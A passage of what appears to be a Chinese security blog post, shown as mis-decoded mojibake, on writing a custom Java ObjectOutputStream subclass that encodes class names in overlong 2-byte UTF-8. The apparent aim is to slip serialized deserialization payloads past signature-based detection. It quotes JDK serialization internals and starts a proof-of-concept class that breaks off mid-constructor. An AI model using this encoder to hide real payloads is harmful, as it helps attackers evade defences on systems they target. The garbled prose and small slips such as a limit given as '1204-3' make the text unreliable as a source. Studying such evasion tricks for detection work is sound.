</span></span></span></code></pre></div><p>åœ¨è¿™é‡Œä»£ç æˆ‘ä»¬å¾ˆå®¹æ˜“å°±å‘ç°æ˜¯å°†<code>uincodeç¼–ç è½¬åŒ–æˆutf-8ç¼–ç </code>çš„æ ¼å¼ï¼Œåªæ˜¯æœ‰èŒƒå›´åˆ¤å®šï¼Œæˆ‘å½“æ—¶ç¬¬ä¸€ååº”å°±æ˜¯<code>é‡å†™è¿™ä¸ªæ–¹æ³•</code>ï¼ŒæŠŠè¿™ä¸ªèŒƒå›´æ”¹äº†ï¼Œä¸å°±èƒ½è®©javaå¸®æˆ‘ä»¬<code>2byteç¼–ç </code>äº†ä¹ˆhh</p>
<p>è¿˜æœ‰ä¸ªç‚¹å°±æ˜¯é•¿åº¦ é€šè¿‡<code>getUTFLength()</code>è¿”å›ï¼Œä¹Ÿè·ŸèŒƒå›´æœ‰å…³ï¼Œé‚£æŠŠè¿™ä¸ªä¹Ÿé‡å†™ä¸å°±è¡Œå•¦hh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">long</span><span class="w"> </span><span class="nf">getUTFLength</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0x0001</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">utflen</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">utflen</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="pocæ„é€ ">pocæ„é€ <a hidden class="anchor" aria-hidden="true" href="#pocæ„é€ ">#</a></h3>
<p>å…¶å®æˆ‘ä»¬æœ€å¤§çš„é—®é¢˜å°±æ˜¯ä¸èƒ½ç›´æ¥é‡å†™<code>writeUTFBody</code>æ–¹æ³•ï¼ˆè¿™é‡Œçš„æ—¶å€™è¿˜ä¸ä¼šagentï¼_!ï¼‰ï¼Œå› ä¸ºä»–æ˜¯<code>private</code>ä¸”æ˜¯<code>ObjectOutputStream</code>çš„å­ç±»</p>
<p>æˆ‘ä»¬çœ‹åˆ°<code>writeUTFBody</code> ifä¼šåˆ¤æ–­èŒƒå›´ç„¶åè¿›è¡Œå¯¹åº”byteçš„ç¼–ç ï¼Œç„¶åæ³¨æ„ä¸‹è¿™é‡Œæ•°æ®å°‘ï¼ˆ&lt;1024ï¼‰çš„æ—¶å€™ä¸ä¼šæ‰§è¡Œä¸‹æ–¹elseä¸­<code>write()</code>æ–¹æ³•ï¼Œå“ªé‡Œä¼šè¿›è¡Œå†™å…¥å‘¢ï¼Œæˆ‘ä»¬æ ¹æ®è°ƒç”¨æ ˆå¾€ä¸ŠæŸ¥æ‰¾</p>
<p><img loading="lazy" src="../images/image-20241216163232428.png" alt="image-20241216163232428"  />
</p>
<p>è§ä¸‹å›¾ï¼Œ<code>writeClassDescriptor(desc);</code>å°±æ˜¯ä¸Šé¢æ‰§è¡Œ<code>å†™å…¥buf</code>çš„æ“ä½œã€‚è€Œ<code>bout.setBlockDataMode(true);</code>é‡Œçš„<code>drain()</code>å‡½æ•°æ‰æ˜¯çœŸæ­£å†™å…¥æ•°æ®çš„æ—¶å€™</p>
<p><img loading="lazy" src="../images/image-20241216163442044.png" alt="image-20241216163442044"  />
</p>
<h4 id="drain">drain()<a hidden class="anchor" aria-hidden="true" href="#drain">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">void</span><span class="w"> </span><span class="nf">drain</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">blkmode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeBlockHeader</span><span class="p">(</span><span class="n">pos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œ<code>out.write</code>æ‰æ˜¯çœŸæ­£è¿›è¡Œå†™å…¥æ“ä½œçš„åœ°æ–¹ã€‚</p>
<h4 id="buf">buf<a hidden class="anchor" aria-hidden="true" href="#buf">#</a></h4>
<p>è¿˜è®°å¾—æˆ‘ä»¬çš„é—®é¢˜ä¹ˆï¼Œä¸èƒ½ç›´æ¥é‡å†™writeUTFBodyæ–¹æ³•ï¼Œé‚£èƒ½ä¸èƒ½è®¾ç½®è¿™ä¸ªbufå€¼å‘¢ï¼Ÿ</p>
<p>åå°„ï¼Ÿå…¶å®ä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬è¦åœ¨æ‰§è¡Œdrain()å‰ä¸€åˆ»è¦†ç›–è¿™ä¸ªå€¼ï¼Œè¿‡æ—©ä¼šè¢«<code>writeUTFBody</code>ä¼šè¢«è¦†ç›–ï¼Œè¿‡æ™šä¹Ÿä¸è¡Œã€‚</p>
<blockquote>
<p>ä½†æ˜¯å¤©æ— ç»äººä¹‹è·¯ï¼ï¼æˆ‘ä»¬å›æƒ³åˆ°<code>writeUTFBody</code>ä¸­ä¸‹é¢ä¸€ä¸ªelseé‡Œä¸æ˜¯æœ‰writeæ“ä½œä¹ˆï¼Ÿè¿™ä¸ªæ˜¯ä»€ä¹ˆé€»è¾‘å‘¢</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">limit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">2</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="c1">// write one byte at a time to normalize block</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¶…è¿‡limitä¼šè¿›å…¥åˆ°è¿™ä¸ªelseï¼Œ<code>limit</code>æ˜¯1204-3ï¼Œæˆ‘ä»¬çœ‹çœ‹writeå¹²äº†å•¥</p>
<p><img loading="lazy" src="../images/image-20241216165006151.png" alt="image-20241216165006151"  />
</p>
<p>å¯ä»¥çœ‹åˆ°å½“posè¶…è¿‡<code>MAX_BLOCK_SIZE</code>æ‰§è¡Œäº†<code>drain()</code>,å°±æ˜¯è¿›è¡Œå†™å…¥ï¼Œç„¶åposå½’0ï¼Œç„¶åä¼šæŠŠ<code>(byte) b</code>è®°å½•åˆ°<code>BlockDataOutputStream.buf</code>ä¸­è¿™é‡Œä¸å°±<strong>å¯ä»¥è®¾ç½®bufå˜é‡çš„å€¼</strong>äº†ä¹ˆï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯<code>BlockDataOutputStream</code>ç±»çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿè°ƒä¸äº†å‘€</p>
<p>ä½†æ˜¯<code>ObjectOutputStream</code>ä¹Ÿæœ‰ä¸ª<code>write</code>å¯ä»¥å¸®æˆ‘ä»¬è°ƒç”¨<code>BlockDataOutputStream</code>çš„writeäº†hhh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">write</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bout</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">val</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>é‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡<code>ObjectOutputStream.write</code>æ¥å°†æˆ‘ä»¬è¦å†™å…¥çš„å€¼è®°å½•åˆ°<code>BlockDataOutputStream.buf</code>ä¸­ï¼Œç„¶å<code>drain()</code>çš„æ—¶å€™è¿›è¡Œå†™å…¥ã€‚</p>
<blockquote>
<p>å¿ƒç†è·¯ç¨‹ï¼ŒæŒºä¹±çš„å¯ä»¥ä¸çœ‹</p>
<p>ä¸èƒ½ç›´æ¥é‡å†™<code>writeUTFBody</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é‡å†™<code>writeUTF</code>ä»–æ˜¯<code>ObjectOutputStream</code>æ–¹æ³•ä¸”æ˜¯<code>public</code>ï¼Œç„¶åæŠŠ<code>writeUTF</code>ä¸­éœ€è¦åŠç”¨çš„æ–¹æ³•éƒ½å¯ä»¥é‡æ–°æ„é€ æˆæˆ‘ä»¬çš„æ–¹æ³•ï¼ˆgetUTFLengthï¼ŒwriteUTFBodyï¼‰//æœ€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯é‡å†™äº†åé¢å‘ç°å…¶å®ä¸æ˜¯ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºå°±ä¿®æ”¹ä¸‹èŒƒå›´å°±æå®šäº†ï¼Œå‘ç°å…¶å®ä¸æ˜¯è¿™ä¹ˆäº‹ï¼Œæœ€åˆçš„pocï¼ˆå°±æ˜¯ä¸‹é¢poc1æŠŠæ³¨é‡Šå–æ¶ˆçš„ä»£ç ï¼‰<strong>å¹¶æ²¡æœ‰è¿›è¡Œç±»åçš„å†™å…¥</strong>ï¼Œç»§ç»­è°ƒè¯•äº†ä¸‹ä»£ç å‘ç°<code>writeBytes</code>å’Œ<code>writeUTFBody</code>ä¸­å…¶å®å¹¶ä¸ä¼šæ‰§è¡ŒçœŸæ­£çš„<code>writeæ“ä½œ</code>ï¼Œåªæ˜¯æŠŠå€¼è®°å½•åˆ°<code>BlockDataOutputStream.buf</code>å˜é‡ä¸­ï¼Œè€Œæˆ‘pocçš„ç±»ä¹Ÿåªæ˜¯è®°å½•åˆ°<code>MyObjectOutputStream.buf</code>,è€Œä¸æ˜¯<code>BlockDataOutputStreamä¸­çš„buf</code>è¿™ä¹Ÿæ˜¯æ‰§è¡Œ<code>drain()</code>çš„æ—¶å€™ï¼Œå…¶å®bufé‡Œæ²¡æœ‰å€¼hhhï¼Œæ‰€ä»¥æ²¡æœ‰å†™å…¥</p>
</blockquote>
<h3 id="poc1">poc1<a hidden class="anchor" aria-hidden="true" href="#poc1">#</a></h3>
<p>è¿™é‡Œæˆ‘æŠŠ2å¤„<code>å°äº7F</code>çš„èŒƒå›´æ”¹æˆï¼Œ<code>c &lt;= 0x0020 &amp;&amp; c != 0</code>ï¼Œ20å¯¹åº”çš„æ˜¯32ï¼Œç©ºç™½ç¬¦å°±1byteçš„æ ¼å¼ï¼Œå¤§äº32çš„å°±é‡‡ç”¨<code>2byte</code>ï¼Œå®ç°æˆ‘ä»¬çš„åŠ å¯†ã€‚</p>
<p>pocä¸­åªæœ‰<code>writeUTF(String s)</code>æ˜¯é‡å†™ï¼Œå…¶ä»–éƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ„å»ºçš„è¿™äº›æ–¹æ³•ï¼Œå› ä¸ºçˆ¶ç±»æ²¡æœ‰è¿™äº›æ–¹æ³•ï¼Œè€Œ<code>writeUTF(String s, long utflen)</code>æ˜¯å› ä¸ºåŒ…çš„åŸå› å…¶å®ä¹Ÿä¸æ˜¯é‡å†™ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">UTF8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.OutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.UTFDataFormatException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyObjectOutputStream</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">MAX_BLOCK_SIZE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1024</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/** maximum data block header length */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">cbuf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="o">[</span><span class="n">CHAR_BUF_SIZE</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/** (tunable) length of char buffer (for writing strings) */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">256</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">MAX_BLOCK_SIZE</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyObjectOutputStream</span><span class="p">(</span><span class="n">OutputStream</span><span class="w"> </span><span class="n">out</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">out</span><span class="p">);</span><span class="w">
